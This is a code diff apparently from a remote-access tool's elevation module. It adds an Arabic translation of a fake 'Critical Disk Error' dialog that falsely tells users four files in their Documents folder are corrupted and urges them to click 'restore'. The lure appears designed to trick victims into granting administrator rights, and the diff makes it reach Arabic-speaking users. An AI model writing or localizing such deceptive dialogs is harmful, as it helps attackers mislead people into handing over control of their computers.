@@ -106,6 +106,19 @@ namespace xClient.Core.Elevation
                     btnRestoreAndCheck.Text = "Dateien wiederherstellen und Festplatte auf Fehler überprüfen";
                     linkError.Text = "Mehr Informationen zu diesem Fehler";
                     break;
+                case "AR": // By : DragonzMaster
+                    this.Text = "خطأ حرج بالقرص";
+                    lblHead.Text = "الملف او المجلد معطوب ولا يمكن قرائته";
+                    lblText.Text =
+                        "تم إيجاد عدة ملفات معطوبة بالمجلد 'مستنداتى'. لمنع\nخسائر كبيرة بالبيانات, من فضلك إسمح لنظام التشغيل بإستعادة هذه الملفات.\n\n" +
+                        "المجلد المعطوب: " + Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
+                        "\n" +
+                        "عدد الملفات المعطوبة: 4";
+                    btnRestore.Text = "إستعادة الملفات";
+                    btnRestoreAndCheck.Text = "إستعادة الملفات و فحص القرص من الأخطاء";
+                    linkError.Text = "لتفاصيل أكثر حول هذا الخطأ";
+                    this.RightToLeft = RightToLeft.Yes;
+                    break;
                 default: // this includes GB, US and all other
                     this.Text = "Critical Disk Error";
                     lblHead.Text = "The file or directory is corrupted and unreadable";
